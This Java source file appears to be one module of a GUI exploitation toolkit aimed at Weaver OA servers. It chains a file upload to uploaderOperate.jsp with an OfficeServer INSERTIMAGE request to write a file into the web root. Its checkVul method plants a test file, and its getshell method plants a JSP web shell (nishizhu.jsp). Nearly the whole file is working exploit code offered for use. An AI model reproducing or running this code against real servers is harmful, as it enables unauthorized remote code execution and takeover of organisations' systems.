package exp.oa.weaveroa;

import core.Exploitlnterface;

import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class weaveroa_workrelate_uploadOperation implements Exploitlnterface {
    private final HashMap<String, String> headers = new HashMap<>();
    private String fileid = "";

    @Override
    public Boolean checkVul(String str, TextArea textArea) {
        return this.att(str, shell.Testpath, textArea, "nishizhu.txt");
    }

    @Override
    public Boolean getshell(String str, TextArea textArea) {
        return this.att(str, shell.Jsppath, textArea, "nishizhu.jsp");
    }

    private Boolean att(String url, String path, TextArea textArea, String filename) {
        this.headers.put("Content-Type", "multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK");
        String fir_post = "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                "Content-Disposition: form-data; name=\"secId\"\r\n" +
                "\r\n" +
                "1\r\n" +
                "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                "Content-Disposition: form-data; name=\"plandetailid\"\r\n" +
                "\r\n" +
                "1\r\n" +
                "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                "Content-Disposition: form-data; name=\"Filedata\"; filename=\"" + filename + "\"\r\n" +
                "\r\n" +
                shell.readFile(path) + "\r\n" +
                "------WebKitFormBoundarymVk33liI64J7GQaK--\r\n";

        Response post = HttpTools.post(url + "/workrelate/plan/util/uploaderOperate.jsp", fir_post, headers, "utf-8");


        if (post.getCode() == 200 && post.getText().contains("&fileid=")) {
            Platform.runLater(() -> {
                textArea.appendText("\n fileid获取成功 开始释放");
            });
            //使用正则表达式抓取filedid
            Pattern pattern = Pattern.compile("fileid=\\d+");
            Matcher matcher = pattern.matcher(post.getText().trim());
            while (matcher.find()) {
                String res = matcher.group();
                String[] split = res.split("=");
                this.fileid = split[1];
            }

            String sec_post = "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                    "Content-Disposition: form-data; name=\"aaa\"\r\n" +
                    "\r\n" +
                    "{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'" + this.fileid + "'}\r\n" +
                    "------WebKitFormBoundarymVk33liI64J7GQaK--";

            Response sec = HttpTools.post(url + "/OfficeServer", sec_post, this.headers, "utf-8");
            if (sec.getCode() == 200 && sec.getText().contains(shell.test_payload)) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 释放成功 检测写入状态");
                });
                Response thired = HttpTools.get(url + "/" + filename, new HashMap<String, String>(), "utf-8");

                if (thired.getCode() == 200 && thired.getText().contains(shell.test_payload)) {
                    Platform.runLater(() -> {
                        textArea.appendText("\n 漏洞存在，测试文件写入成功 \n " + url + "/" + filename);
                    });
                    return true;
                } else {
                    Platform.runLater(() -> {
                        textArea.appendText("\n 漏洞可能存在，疑似WAF拦截，请手动复现");
                    });
                    return false;
                }

            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 漏洞可能存在，疑似WAF拦截，请手动复现");
                });
                return false;
            }


        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n weaveroa_workrelate_uploadOperation - 漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }


    }
}
